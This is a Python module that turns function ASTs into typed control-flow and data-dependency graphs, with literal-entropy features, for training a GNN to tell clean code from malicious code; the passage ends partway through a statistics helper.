"""
backend/src/cfg_extractor.py

Phase 1: AST → CFG/DDG Typed Graph Serializer
==============================================
Converts a normalized Python function AST into a typed directed graph (V, E)
for PyTorch Geometric GNN training and differential taint analysis.

Graph semantics
---------------
Nodes (V):  One node per statement (compound statements become headers).
            Expression nodes are created for Calls and high-entropy literals
            to preserve their structural context.

            Feature vector per node:
              [0 : NODE_TYPE_DIM]   one-hot semantic type  (47 dims)
              [NODE_TYPE_DIM]       normalized depth
              [NODE_TYPE_DIM+1]     normalized child index
              [NODE_TYPE_DIM+2]     Shannon entropy / 8.0   (for literals; else 0)
              [NODE_TYPE_DIM+3]     is_loop_related         (binary)
              [NODE_TYPE_DIM+4]     is_exception_related    (binary)

Edges (E):  Typed directed edges.  Type encoded as integer in edge_attr.
  0  CFG_SEQUENTIAL    — linear control flow: A executes immediately before B
  1  CFG_BRANCH_TRUE   — conditional true branch
  2  CFG_BRANCH_FALSE  — conditional false branch / loop-exhausted exit
  3  CFG_LOOP_BACK     — loop body back-edge to header
  4  CFG_EXCEPTION     — exceptional control transfer to a handler
  5  DATA_DEF_USE      — data dependency: variable defined at A, used at B
  6  AST_CHILD         — structural parent → child (for expression sub-trees)

Usage
-----
    from cfg_extractor import extract_function_graph

    # from source code
    pyg_data = extract_function_graph(source_code, label=1)

    # from a pre-parsed, normalized FunctionDef node
    extractor = CFGExtractor()
    nodes, edges = extractor.extract(func_ast_node)
    pyg_data     = graph_to_pyg(nodes, edges, label=1)
"""

from __future__ import annotations

import ast
import math
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Optional

# torch and torch_geometric are imported lazily inside graph_to_pyg()
# and extract_all_functions() so that CFGExtractor, shannon_entropy,
# entropy_of_node, GraphNode, and GraphEdge are usable without PyTorch
# installed (e.g. in entropy_profiler.py and diff_analyzer.py).

# ============================================================================
# A.  Semantic Node-Type Vocabulary
# ============================================================================

NODE_TYPE_VOCAB: dict[str, int] = {
    "ENTRY":                0,
    "EXIT":                 1,
    "FUNC_DEF":             2,
    "CLASS_DEF":            3,
    "ASSIGN":               4,
    "AUG_ASSIGN":           5,
    "ANN_ASSIGN":           6,
    "CALL":                 7,
    "RETURN":               8,
    "YIELD":                9,
    "AWAIT":               10,
    "IF_BRANCH":           11,
    "LOOP_FOR":            12,
    "LOOP_WHILE":          13,
    "EXCEPTION_TRY":       14,
    "EXCEPTION_RAISE":     15,
    "EXCEPTION_HANDLER":   16,
    "IMPORT":              17,
    "DELETE":              18,
    "ASSERT":              19,
    "WITH":                20,
    "GLOBAL_NONLOCAL":     21,
    "PASS":                22,
    "BREAK":               23,
    "CONTINUE":            24,
    "MATCH":               25,
    "BINOP":               26,
    "UNARYOP":             27,
    "BOOLOP":              28,
    "COMPARE":             29,
    "ATTRIBUTE":           30,
    "SUBSCRIPT":           31,
    "LITERAL_NUM":         32,
    "LITERAL_STR":         33,
    "LITERAL_BYTES":       34,
    "LITERAL_OTHER":       35,
    "CONTAINER_LIST":      36,
    "CONTAINER_DICT":      37,
    "CONTAINER_SET":       38,
    "COMPREHENSION":       39,
    "LAMBDA":              40,
    "FSTRING":             41,
    "NAME":                42,
    "STARRED":             43,
    "SLICE":               44,
    "EXPR_STMT":           45,
    "UNKNOWN":             46,
}

NODE_TYPE_DIM: int = len(NODE_TYPE_VOCAB)   # 47
FEATURE_DIM:   int = NODE_TYPE_DIM + 5      # 52

# AST type → semantic bucket (covers all stdlib ast node types)
_AST_TO_SEM: dict[type, str] = {
    ast.FunctionDef:      "FUNC_DEF",
    ast.AsyncFunctionDef: "FUNC_DEF",
    ast.ClassDef:         "CLASS_DEF",
    ast.Assign:           "ASSIGN",
    ast.AugAssign:        "AUG_ASSIGN",
    ast.AnnAssign:        "ANN_ASSIGN",
    ast.NamedExpr:        "ASSIGN",
    ast.Call:             "CALL",
    ast.Return:           "RETURN",
    ast.Yield:            "YIELD",
    ast.YieldFrom:        "YIELD",
    ast.Await:            "AWAIT",
    ast.If:               "IF_BRANCH",
    ast.For:              "LOOP_FOR",
    ast.AsyncFor:         "LOOP_FOR",
    ast.While:            "LOOP_WHILE",
    ast.Try:              "EXCEPTION_TRY",
    ast.Raise:            "EXCEPTION_RAISE",
    ast.ExceptHandler:    "EXCEPTION_HANDLER",
    ast.Import:           "IMPORT",
    ast.ImportFrom:       "IMPORT",
    ast.Delete:           "DELETE",
    ast.Assert:           "ASSERT",
    ast.With:             "WITH",
    ast.AsyncWith:        "WITH",
    ast.Global:           "GLOBAL_NONLOCAL",
    ast.Nonlocal:         "GLOBAL_NONLOCAL",
    ast.Pass:             "PASS",
    ast.Break:            "BREAK",
    ast.Continue:         "CONTINUE",
    ast.BinOp:            "BINOP",
    ast.UnaryOp:          "UNARYOP",
    ast.BoolOp:           "BOOLOP",
    ast.Compare:          "COMPARE",
    ast.Attribute:        "ATTRIBUTE",
    ast.Subscript:        "SUBSCRIPT",
    ast.List:             "CONTAINER_LIST",
    ast.Tuple:            "CONTAINER_LIST",
    ast.Set:              "CONTAINER_SET",
    ast.Dict:             "CONTAINER_DICT",
    ast.ListComp:         "COMPREHENSION",
    ast.SetComp:          "COMPREHENSION",
    ast.DictComp:         "COMPREHENSION",
    ast.GeneratorExp:     "COMPREHENSION",
    ast.Lambda:           "LAMBDA",
    ast.JoinedStr:        "FSTRING",
    ast.Name:             "NAME",
    ast.Starred:          "STARRED",
    ast.Slice:            "SLICE",
    ast.Expr:             "EXPR_STMT",
}

# Patch in Python 3.10+ node types at import time
if hasattr(ast, "Match"):
    _AST_TO_SEM[ast.Match]      = "MATCH"      # type: ignore[attr-defined]
    _AST_TO_SEM[ast.match_case] = "MATCH"      # type: ignore[attr-defined]
if hasattr(ast, "TryStar"):
    _AST_TO_SEM[ast.TryStar]    = "EXCEPTION_TRY"  # type: ignore[attr-defined]

# Loop and exception semantic groupings (used for binary feature flags)
_LOOP_TYPES      = {"LOOP_FOR", "LOOP_WHILE", "CONTINUE", "BREAK"}
_EXCEPT_TYPES    = {"EXCEPTION_TRY", "EXCEPTION_RAISE", "EXCEPTION_HANDLER"}


def sem_type_of(node: ast.AST) -> str:
    """Map an AST node instance to its semantic bucket string."""
    if isinstance(node, ast.Constant):
        v = node.value
        if isinstance(v, (int, float, complex)):
            return "LITERAL_NUM"
        if isinstance(v, str):
            return "LITERAL_STR"
        if isinstance(v, bytes):
            return "LITERAL_BYTES"
        return "LITERAL_OTHER"
    return _AST_TO_SEM.get(type(node), "UNKNOWN")


# ============================================================================
# B.  Shannon Entropy Module (Phase 2 hook, used here for node features)
# ============================================================================

def shannon_entropy(data: bytes | str) -> float:
    """
    Compute per-symbol Shannon entropy H(X) = -Σ p(x)·log₂p(x).

    Input is treated as a byte sequence.  Returns a value in [0.0, 8.0]
    (bits per byte), where 8.0 is maximum theoretical entropy for a
    uniformly random byte stream (e.g. encrypted or compressed payloads).

    High entropy (> 6.5) in a string literal is a strong indicator of
    Base64-packed, AES-encrypted, or zlib-compressed payloads.
    """
    if isinstance(data, str):
        raw: bytes = data.encode("utf-8", errors="replace")
    else:
        raw = data
    if not raw:
        return 0.0
    freq: dict[int, int] = defaultdict(int)
    for byte in raw:
        freq[byte] += 1
    n = len(raw)
    return -sum((c / n) * math.log2(c / n) for c in freq.values())


def entropy_of_node(node: ast.AST) -> float:
    """
    Extract Shannon entropy from a Constant literal AST node.
    Returns 0.0 for non-literal nodes or very short strings (< 8 chars).
    """
    if not isinstance(node, ast.Constant):
        return 0.0
    v = node.value
    if isinstance(v, bytes) and len(v) >= 4:
        return shannon_entropy(v)
    if isinstance(v, str) and len(v) >= 8:
        return shannon_entropy(v)
    return 0.0


# ============================================================================
# C.  Internal Graph Representation
# ============================================================================

class _SyntheticAST:
    """Lightweight placeholder for synthetic ENTRY / EXIT nodes."""
    __slots__ = ("label",)

    def __init__(self, label: str) -> None:
        self.label = label


@dataclass
class GraphNode:
    node_id:     int
    sem_type:    str
    ast_ref:     ast.AST | _SyntheticAST
    depth:       int   = 0
    child_index: int   = 0
    parent_type: str   = "NONE"
    entropy:     float = 0.0


@dataclass
class GraphEdge:
    src:       int
    dst:       int
    edge_type: int


# ============================================================================
# D.  Loop and Try context objects
# ============================================================================

@dataclass
class _LoopCtx:
    """Propagates loop header ID to nested break/continue statements."""
    header:     int
    exit_nodes: list[int] = field(default_factory=list)


@dataclass
class _TryCtx:
    """Propagates active exception handler IDs to raise statements."""
    handler_ids: list[int] = field(default_factory=list)


# ============================================================================
# E.  CFG / DDG Extractor
# ============================================================================

class CFGExtractor:
    """
    Converts a normalized Python FunctionDef AST into a CFG+DDG typed digraph.

    The extractor operates in two passes:
      Pass 1 — Build the CFG: create nodes for every statement, connect
                with typed edges representing control flow.
      Pass 2 — Emit DDG edges: for every variable use, emit DATA_DEF_USE
                edges from all reaching definition sites.

    The extractor is stateless between calls to extract(); it is safe to
    reuse across multiple functions.
    """

    def __init__(self) -> None:
        self._nodes:    list[GraphNode]          = []
        self._edges:    list[GraphEdge]          = []
        # def-use: var_name → list of defining node IDs (scope-flat, intra-function)
        self._def_map:  dict[str, list[int]]     = defaultdict(list)
        # Pending DDG pairs to emit after CFG is complete
        self._ddg_pairs: list[tuple[int, int]]   = []

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def extract(
        self,
        func_node: ast.FunctionDef | ast.AsyncFunctionDef,
    ) -> tuple[list[GraphNode], list[GraphEdge]]:
        """
        Extract the CFG+DDG graph from a single function definition node.

        Returns (nodes, edges).  Node IDs are stable array indices.
        """
        self._nodes.clear()
        self._edges.clear()
        self._def_map.clear()
        self._ddg_pairs.clear()

        # Synthetic ENTRY — represents function entry point and parameter defs
        entry_id = self._add_node(_SyntheticAST("ENTRY"), "ENTRY", depth=0)

        # Register all parameters as definitions reachable from ENTRY
        for arg in (
            func_node.args.posonlyargs
            + func_node.args.args
            + func_node.args.kwonlyargs
        ):
            self._def_map[arg.arg].append(entry_id)
        if func_node.args.vararg:
            self._def_map[func_node.args.vararg.arg].append(entry_id)
        if func_node.args.kwarg:
            self._def_map[func_node.args.kwarg.arg].append(entry_id)

        # Pass 1: build CFG over function body
        live = self._build_stmts(
            stmts=func_node.body,
            predecessors=[(entry_id, 0)],   # 0 = CFG_SEQUENTIAL
            loop_ctx=None,
            try_ctx=None,
            depth=1,
            parent_type="FUNC_DEF",
        )

        # Synthetic EXIT
        exit_id = self._add_node(_SyntheticAST("EXIT"), "EXIT", depth=0)
        for nid in live:
            self._add_edge(nid, exit_id, 0)  # CFG_SEQUENTIAL

        # Pass 2: emit DDG edges (def → use)
        for def_id, use_id in self._ddg_pairs:
            self._add_edge(def_id, use_id, 5)  # DATA_DEF_USE

        return self._nodes, self._edges

    # ------------------------------------------------------------------
    # Node / edge primitives
    # ------------------------------------------------------------------

    def _add_node(
        self,
        ast_ref: ast.AST | _SyntheticAST,
        sem_override: str | None = None,
        depth: int = 0,
        child_index: int = 0,
        parent_type: str = "NONE",
    ) -> int:
        sem = sem_override if sem_override is not None else sem_type_of(ast_ref)  # type: ignore[arg-type]
        # Compute the maximum Shannon entropy of any literal in the node's subtree.
        # This captures high-entropy payloads nested inside Assign/Call/Return nodes.
        if isinstance(ast_ref, _SyntheticAST):
            entropy = 0.0
        else:
            entropy = max(
                (entropy_of_node(child)
                 for child in ast.walk(ast_ref)  # type: ignore[arg-type]
                 if isinstance(child, ast.Constant)),
                default=0.0,
            )
        nid = len(self._nodes)
        self._nodes.append(
            GraphNode(
                node_id=nid,
                sem_type=sem,
                ast_ref=ast_ref,
                depth=depth,
                child_index=child_index,
                parent_type=parent_type,
                entropy=entropy,
            )
        )
        return nid

    def _add_edge(self, src: int, dst: int, edge_type: int) -> None:
        if src >= 0 and dst >= 0 and src != dst:
            self._edges.append(GraphEdge(src=src, dst=dst, edge_type=edge_type))

    def _connect_preds(self, predecessors: list[tuple[int, int]], dst: int) -> None:
        """Connect all typed predecessors to a destination node."""
        for pred_id, edge_type in predecessors:
            self._add_edge(pred_id, dst, edge_type)

    # ------------------------------------------------------------------
    # CFG construction — statement worklist
    # ------------------------------------------------------------------

    def _build_stmts(
        self,
        stmts: list[ast.stmt],
        predecessors: list[tuple[int, int]],  # (node_id, edge_type)
        loop_ctx:    Optional[_LoopCtx],
        try_ctx:     Optional[_TryCtx],
        depth:       int,
        parent_type: str = "NONE",
    ) -> list[int]:
        """
        Build CFG nodes for a flat statement list.

        predecessors: typed incoming edges for the first statement.
        Returns: list of 'live' node IDs that flow out of this block
                 (to be connected with CFG_SEQUENTIAL to the next construct).
        """
        live_preds: list[tuple[int, int]] = list(predecessors)

        for idx, stmt in enumerate(stmts):

            # --- Compound statements: delegate to specialized builders ---
            if isinstance(stmt, ast.If):
                live = self._build_if(stmt, live_preds, loop_ctx, try_ctx, depth, idx)

            elif isinstance(stmt, (ast.For, ast.AsyncFor)):
                live = self._build_for(stmt, live_preds, try_ctx, depth, idx)

            elif isinstance(stmt, ast.While):
                live = self._build_while(stmt, live_preds, try_ctx, depth, idx)

            elif isinstance(stmt, ast.Try) or (
                hasattr(ast, "TryStar") and isinstance(stmt, ast.TryStar)  # type: ignore[attr-defined]
            ):
                live = self._build_try(stmt, live_preds, loop_ctx, depth, idx)

            elif isinstance(stmt, (ast.With, ast.AsyncWith)):
                live = self._build_with(stmt, live_preds, loop_ctx, try_ctx, depth, idx)

            elif hasattr(ast, "Match") and isinstance(stmt, ast.Match):  # type: ignore[attr-defined]
                live = self._build_match(stmt, live_preds, loop_ctx, try_ctx, depth, idx)

            # --- Terminal statements: path ends here ---
            elif isinstance(stmt, ast.Return):
                nid = self._add_node(stmt, depth=depth, child_index=idx, parent_type=parent_type)
                self._connect_preds(live_preds, nid)
                if stmt.value is not None:
                    self._record_uses(stmt.value, nid)
                live = []  # Return terminates this execution path

            elif isinstance(stmt, ast.Raise):
                nid = self._add_node(stmt, depth=depth, child_index=idx, parent_type=parent_type)
                self._connect_preds(live_preds, nid)
                if stmt.exc is not None:
                    self._record_uses(stmt.exc, nid)
                # Propagate to active exception handlers
                if try_ctx:
                    for h_id in try_ctx.handler_ids:
                        self._add_edge(nid, h_id, 4)  # CFG_EXCEPTION
                live = []  # Raise terminates this execution path

            elif isinstance(stmt, ast.Break):
                nid = self._add_node(stmt, depth=depth, child_index=idx, parent_type=parent_type)
                self._connect_preds(live_preds, nid)
                if loop_ctx is not None:
                    loop_ctx.exit_nodes.append(nid)
                live = []

            elif isinstance(stmt, ast.Continue):
                nid = self._add_node(stmt, depth=depth, child_index=idx, parent_type=parent_type)
                self._connect_preds(live_preds, nid)
                if loop_ctx is not None:
                    self._add_edge(nid, loop_ctx.header, 3)  # CFG_LOOP_BACK
                live = []

            # --- Simple statements ---
            else:
                nid = self._add_node(stmt, depth=depth, child_index=idx, parent_type=parent_type)
                self._connect_preds(live_preds, nid)
                self._record_defs_and_uses(stmt, nid)
                live = [nid]

            # Advance predecessors; subsequent stmts connect with SEQUENTIAL
            live_preds = [(nid, 0) for nid in live]

        return [nid for nid, _ in live_preds]

    # ------------------------------------------------------------------
    # Compound statement builders
    # ------------------------------------------------------------------

    def _build_if(
        self,
        node:       ast.If,
        predecessors: list[tuple[int, int]],
        loop_ctx:   Optional[_LoopCtx],
        try_ctx:    Optional[_TryCtx],
        depth:      int,
        child_index: int,
    ) -> list[int]:
        if_id = self._add_node(node, depth=depth, child_index=child_index, parent_type="IF_BRANCH")
        self._connect_preds(predecessors, if_id)
        self._record_uses(node.test, if_id)

        # True branch
        if node.body:
            true_live = self._build_stmts(
                stmts=node.body,
                predecessors=[(if_id, 1)],   # CFG_BRANCH_TRUE
                loop_ctx=loop_ctx,
                try_ctx=try_ctx,
                depth=depth + 1,
                parent_type="IF_BRANCH",
            )
        else:
            true_live = [if_id]

        # False branch (elif is represented as nested If in orelse)
        if node.orelse:
            false_live = self._build_stmts(
                stmts=node.orelse,
                predecessors=[(if_id, 2)],   # CFG_BRANCH_FALSE
                loop_ctx=loop_ctx,
                try_ctx=try_ctx,
                depth=depth + 1,
                parent_type="IF_BRANCH",
            )
        else:
            # No else: if_id itself is a live exit (falls through)
            false_live = [if_id]

        return true_live + false_live

    def _build_for(
        self,
        node:       ast.For | ast.AsyncFor,
        predecessors: list[tuple[int, int]],
        try_ctx:    Optional[_TryCtx],
        depth:      int,
        child_index: int,
    ) -> list[int]:
        header_id = self._add_node(node, depth=depth, child_index=child_index, parent_type="LOOP_FOR")
        self._connect_preds(predecessors, header_id)
        # Register loop variable as a definition
        for name in self._extract_names(node.target):
            self._def_map[name].append(header_id)
        self._record_uses(node.iter, header_id)

        loop_ctx = _LoopCtx(header=header_id)

        body_live = self._build_stmts(
            stmts=node.body,
            predecessors=[(header_id, 0)],   # CFG_SEQUENTIAL (enter body)
            loop_ctx=loop_ctx,
            try_ctx=try_ctx,
            depth=depth + 1,
            parent_type="LOOP_FOR",
        )

        # Back-edges from body exits to header
        for nid in body_live:
            self._add_edge(nid, header_id, 3)  # CFG_LOOP_BACK

        # For-else clause (runs when loop completes without break)
        if node.orelse:
            else_live = self._build_stmts(
                stmts=node.orelse,
                predecessors=[(header_id, 2)],  # CFG_BRANCH_FALSE (exhausted)
                loop_ctx=None,
                try_ctx=try_ctx,
                depth=depth + 1,
                parent_type="LOOP_FOR",
            )
        else:
            else_live = [header_id]

        # Break exits + else exits are all live out of the loop construct
        return loop_ctx.exit_nodes + else_live

    def _build_while(
        self,
        node:       ast.While,
        predecessors: list[tuple[int, int]],
        try_ctx:    Optional[_TryCtx],
        depth:      int,
        child_index: int,
    ) -> list[int]:
        header_id = self._add_node(node, depth=depth, child_index=child_index, parent_type="LOOP_WHILE")
        self._connect_preds(predecessors, header_id)
        self._record_uses(node.test, header_id)

        loop_ctx = _LoopCtx(header=header_id)

        body_live = self._build_stmts(
            stmts=node.body,
            predecessors=[(header_id, 0)],   # enter body
            loop_ctx=loop_ctx,
            try_ctx=try_ctx,
            depth=depth + 1,
            parent_type="LOOP_WHILE",
        )

        for nid in body_live:
            self._add_edge(nid, header_id, 3)  # CFG_LOOP_BACK

        if node.orelse:
            else_live = self._build_stmts(
                stmts=node.orelse,
                predecessors=[(header_id, 2)],  # CFG_BRANCH_FALSE (condition false)
                loop_ctx=None,
                try_ctx=try_ctx,
                depth=depth + 1,
                parent_type="LOOP_WHILE",
            )
        else:
            else_live = [header_id]

        return loop_ctx.exit_nodes + else_live

    def _build_try(
        self,
        node:       ast.Try,
        predecessors: list[tuple[int, int]],
        loop_ctx:   Optional[_LoopCtx],
        depth:      int,
        child_index: int,
    ) -> list[int]:
        try_id = self._add_node(node, depth=depth, child_index=child_index, parent_type="EXCEPTION_TRY")
        self._connect_preds(predecessors, try_id)

        # Pre-register handler nodes so CFG_EXCEPTION edges can be emitted
        # during body construction (Raise statements need handler IDs)
        handler_ids: list[int] = []
        handler_nodes: list[tuple[ast.ExceptHandler, int]] = []
        for h_idx, handler in enumerate(node.handlers):
            h_id = self._add_node(
                handler,
                depth=depth + 1,
                child_index=h_idx,
                parent_type="EXCEPTION_TRY",
            )
            handler_ids.append(h_id)
            handler_nodes.append((handler, h_id))
            if handler.name:
                self._def_map[handler.name].append(h_id)
            # try_id → handler_id (any stmt in body can raise)
            self._add_edge(try_id, h_id, 4)  # CFG_EXCEPTION

        inner_try_ctx = _TryCtx(handler_ids=handler_ids)

        # Build try body
        body_live = self._build_stmts(
            stmts=node.body,
            predecessors=[(try_id, 0)],
            loop_ctx=loop_ctx,
            try_ctx=inner_try_ctx,
            depth=depth + 1,
            parent_type="EXCEPTION_TRY",
        )

        # Build each handler body (connected from its pre-registered handler node)
        handler_live: list[int] = []
        for handler, h_id in handler_nodes:
            h_body_live = self._build_stmts(
                stmts=handler.body,
                predecessors=[(h_id, 0)],
                loop_ctx=loop_ctx,
                try_ctx=None,   # handlers don't re-propagate by default
                depth=depth + 2,
                parent_type="EXCEPTION_HANDLER",
            )
            handler_live.extend(h_body_live)

        # else clause: executes when no exception was raised
        if node.orelse:
            else_live = self._build_stmts(
                stmts=node.orelse,
                predecessors=[(nid, 0) for nid in body_live],
                loop_ctx=loop_ctx,
                try_ctx=None,
                depth=depth + 1,
                parent_type="EXCEPTION_TRY",
            )
        else:
            else_live = body_live

        all_live = else_live + handler_live

        # finally clause: always executes
        if node.finalbody:
            all_live = self._build_stmts(
                stmts=node.finalbody,
                predecessors=[(nid, 0) for nid in all_live],
                loop_ctx=loop_ctx,
                try_ctx=None,
                depth=depth + 1,
                parent_type="EXCEPTION_TRY",
            )

        return all_live

    def _build_with(
        self,
        node:       ast.With | ast.AsyncWith,
        predecessors: list[tuple[int, int]],
        loop_ctx:   Optional[_LoopCtx],
        try_ctx:    Optional[_TryCtx],
        depth:      int,
        child_index: int,
    ) -> list[int]:
        with_id = self._add_node(node, depth=depth, child_index=child_index, parent_type="WITH")
        self._connect_preds(predecessors, with_id)
        for item in node.items:
            self._record_uses(item.context_expr, with_id)
            if item.optional_vars is not None:
                for name in self._extract_names(item.optional_vars):
                    self._def_map[name].append(with_id)

        return self._build_stmts(
            stmts=node.body,
            predecessors=[(with_id, 0)],
            loop_ctx=loop_ctx,
            try_ctx=try_ctx,
            depth=depth + 1,
            parent_type="WITH",
        )

    def _build_match(
        self,
        node:       ast.Match,                        # type: ignore[name-defined]
        predecessors: list[tuple[int, int]],
        loop_ctx:   Optional[_LoopCtx],
        try_ctx:    Optional[_TryCtx],
        depth:      int,
        child_index: int,
    ) -> list[int]:
        match_id = self._add_node(node, depth=depth, child_index=child_index, parent_type="MATCH")
        self._connect_preds(predecessors, match_id)
        self._record_uses(node.subject, match_id)

        all_live: list[int] = []
        for c_idx, case in enumerate(node.cases):
            case_live = self._build_stmts(
                stmts=case.body,
                predecessors=[(match_id, 1)],   # CFG_BRANCH_TRUE (case matched)
                loop_ctx=loop_ctx,
                try_ctx=try_ctx,
                depth=depth + 1,
                parent_type="MATCH",
            )
            all_live.extend(case_live)

        # match_id is live if no case matched (exhaustive match can't guarantee coverage)
        all_live.append(match_id)
        return all_live

    # ------------------------------------------------------------------
    # Def-use tracking (DDG Pass 2 preparation)
    # ------------------------------------------------------------------

    def _record_defs_and_uses(self, stmt: ast.stmt, nid: int) -> None:
        """
        Record all variable definitions and uses in a simple statement.
        Defs update self._def_map; uses record pending DDG pairs.
        """
        # Determine what this statement defines
        def_names = self._get_def_names(stmt)
        for name in def_names:
            self._def_map[name].append(nid)

        # Walk the statement for all Load-context Name nodes (uses)
        # Skip names that are being defined (they appear as Store/Del context)
        use_names = self._get_use_names(stmt)
        for name in use_names:
            for def_id in self._def_map.get(name, []):
                self._ddg_pairs.append((def_id, nid))

    def _record_uses(self, expr: ast.expr | None, nid: int) -> None:
        """Record variable uses in a sub-expression for DDG edges."""
        if expr is None:
            return
        for name in self._get_use_names(expr):
            for def_id in self._def_map.get(name, []):
                self._ddg_pairs.append((def_id, nid))

    def _get_def_names(self, stmt: ast.stmt) -> list[str]:
        """Extract names being defined/assigned by this statement."""
        if isinstance(stmt, ast.Assign):
            return [n for t in stmt.targets for n in self._extract_names(t)]
        if isinstance(stmt, ast.AugAssign):
            return self._extract_names(stmt.target)
        if isinstance(stmt, ast.AnnAssign):
            if stmt.value is not None:
                return self._extract_names(stmt.target)
            return []
        if isinstance(stmt, (ast.For, ast.AsyncFor)):
            return self._extract_names(stmt.target)
        if isinstance(stmt, (ast.With, ast.AsyncWith)):
            names: list[str] = []
            for item in stmt.items:
                if item.optional_vars is not None:
                    names.extend(self._extract_names(item.optional_vars))
            return names
        if isinstance(stmt, ast.ExceptHandler):
            return [stmt.name] if stmt.name else []
        if isinstance(stmt, (ast.Import, ast.ImportFrom)):
            result: list[str] = []
            for alias in stmt.names:
                bound = alias.asname if alias.asname else alias.name.split(".")[0]
                result.append(bound)
            return result
        if isinstance(stmt, ast.Global):
            return list(stmt.names)
        if isinstance(stmt, ast.Nonlocal):
            return list(stmt.names)
        return []

    def _get_use_names(self, node: ast.AST) -> list[str]:
        """Collect all variable names appearing in Load context under this node."""
        return [
            child.id
            for child in ast.walk(node)
            if isinstance(child, ast.Name) and isinstance(child.ctx, ast.Load)
        ]

    @staticmethod
    def _extract_names(node: ast.AST) -> list[str]:
        """Recursively extract Name.id values from an assignment target pattern."""
        if isinstance(node, ast.Name):
            return [node.id]
        if isinstance(node, (ast.Tuple, ast.List)):
            return [n for elt in node.elts for n in CFGExtractor._extract_names(elt)]
        if isinstance(node, ast.Starred):
            return CFGExtractor._extract_names(node.value)
        return []


# ============================================================================
# F.  PyTorch Geometric Serializer
# ============================================================================

def graph_to_pyg(
    nodes: list[GraphNode],
    edges: list[GraphEdge],
    label: int | None = None,
):
    """
    Serialize a (nodes, edges) graph into a torch_geometric.data.Data object.

    Node feature matrix x  — shape [N, FEATURE_DIM] (52 dims):
      [:NODE_TYPE_DIM]    one-hot semantic type
      [NODE_TYPE_DIM]     normalized depth      (depth / 20.0, capped)
      [NODE_TYPE_DIM+1]   normalized child idx  (child_index / 50.0, capped)
      [NODE_TYPE_DIM+2]   Shannon entropy       (entropy / 8.0)
      [NODE_TYPE_DIM+3]   is_loop_related       (binary)
      [NODE_TYPE_DIM+4]   is_exception_related  (binary)

    Edge index  — shape [2, E]  (COO format, required by PyG)
    Edge attr   — shape [E, 7]  one-hot edge type
    y           — shape [1]     graph-level label (0=clean, 1=malicious)
    """
    import torch  # deferred: not needed by torch-free consumers
    from torch_geometric.data import Data  # deferred

    n = len(nodes)
    if n == 0:
        # Degenerate graph: single zero-feature node
        x = torch.zeros((1, FEATURE_DIM), dtype=torch.float)
        edge_index = torch.zeros((2, 0), dtype=torch.long)
        edge_attr  = torch.zeros((0, 7), dtype=torch.float)
        y = torch.tensor([label], dtype=torch.long) if label is not None else None
        return Data(x=x, edge_index=edge_index, edge_attr=edge_attr, y=y)

    # --- Node features ---
    max_depth   = max(nd.depth       for nd in nodes) or 1
    max_child   = max(nd.child_index for nd in nodes) or 1

    x = torch.zeros((n, FEATURE_DIM), dtype=torch.float)
    for nd in nodes:
        row = nd.node_id
        type_idx = NODE_TYPE_VOCAB.get(nd.sem_type, NODE_TYPE_VOCAB["UNKNOWN"])
        x[row, type_idx] = 1.0
        x[row, NODE_TYPE_DIM]     = min(nd.depth       / max_depth, 1.0)
        x[row, NODE_TYPE_DIM + 1] = min(nd.child_index / max_child, 1.0)
        x[row, NODE_TYPE_DIM + 2] = nd.entropy / 8.0
        x[row, NODE_TYPE_DIM + 3] = 1.0 if nd.sem_type in _LOOP_TYPES   else 0.0
        x[row, NODE_TYPE_DIM + 4] = 1.0 if nd.sem_type in _EXCEPT_TYPES else 0.0

    # --- Edges ---
    if edges:
        src_list  = [e.src       for e in edges]
        dst_list  = [e.dst       for e in edges]
        type_list = [e.edge_type for e in edges]

        edge_index = torch.tensor([src_list, dst_list], dtype=torch.long)

        num_edge_types = 7
        edge_attr = torch.zeros((len(edges), num_edge_types), dtype=torch.float)
        for i, et in enumerate(type_list):
            if 0 <= et < num_edge_types:
                edge_attr[i, et] = 1.0
    else:
        edge_index = torch.zeros((2, 0), dtype=torch.long)
        edge_attr  = torch.zeros((0, 7), dtype=torch.float)

    y = torch.tensor([label], dtype=torch.long) if label is not None else None

    return Data(x=x, edge_index=edge_index, edge_attr=edge_attr, y=y)


# ============================================================================
# G.  Public convenience API
# ============================================================================

def extract_function_graph(
    source_or_func: str | ast.FunctionDef | ast.AsyncFunctionDef,
    label: int | None = None,
    normalize: bool = True,
):
    """
    High-level entry point: source code (or pre-parsed FunctionDef) → PyG Data.

    Parameters
    ----------
    source_or_func : str | ast.FunctionDef | ast.AsyncFunctionDef
        Either raw source code for a single function, or an already-parsed
        FunctionDef node (normalized or not).
    label : int | None
        Graph-level label (0 = clean, 1 = malicious). Stored in Data.y.
    normalize : bool
        If True and source_or_func is a string, applies codeNormalizer to
        anonymize identifiers before graph extraction.

    Returns
    -------
    torch_geometric.data.Data | None
        None if parsing fails or no function definitions are found.
    """
    extractor = CFGExtractor()

    if isinstance(source_or_func, (ast.FunctionDef, ast.AsyncFunctionDef)):
        nodes, edges = extractor.extract(source_or_func)
        return graph_to_pyg(nodes, edges, label=label)

    # Parse from source string
    try:
        tree = ast.parse(source_or_func)
    except SyntaxError:
        return None

    if normalize:
        try:
            from normalizer_AST import codeNormalizer  # type: ignore[import]
            normalizer = codeNormalizer()
            tree = normalizer.visit(tree)
        except ImportError:
            pass  # Normalizer not available; proceed without it

    # Extract the first top-level FunctionDef
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            nodes, edges = extractor.extract(node)
            return graph_to_pyg(nodes, edges, label=label)

    return None


def extract_all_functions(
    source: str,
    label: int | None = None,
    normalize: bool = True,
) -> list:
    """
    Extract one PyG Data graph per top-level function defined in source.

    This is the primary entry point for the dataPipeline_AST training loop.
    """
    try:
        tree = ast.parse(source)
    except SyntaxError:
        return []

    if normalize:
        try:
            from normalizer_AST import codeNormalizer  # type: ignore[import]
            normalizer = codeNormalizer()
            tree = normalizer.visit(tree)
        except ImportError:
            pass

    extractor = CFGExtractor()
    graphs: list[Data] = []

    for node in tree.body:
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            ns, es = extractor.extract(node)
            graphs.append(graph_to_pyg(ns, es, label=label))

    return graphs


# ============================================================================
# H.  Graph statistics (for debugging and pipeline validation)
# ============================================================================

def graph_stats(nodes: list[GraphNode], edges: list[GraphEdge]) -> dict[str, object]:
    """Return diagnostic statistics for a (nodes, edges) graph."""
    edge_type_counts: dict[str, int] = {
        "CFG_SEQUENTIAL":  0,
        "CFG_BRANCH_TRUE": 0,
        "CFG_BRANCH_FALSE": 0,
        "CFG_LOOP_BACK":   0,
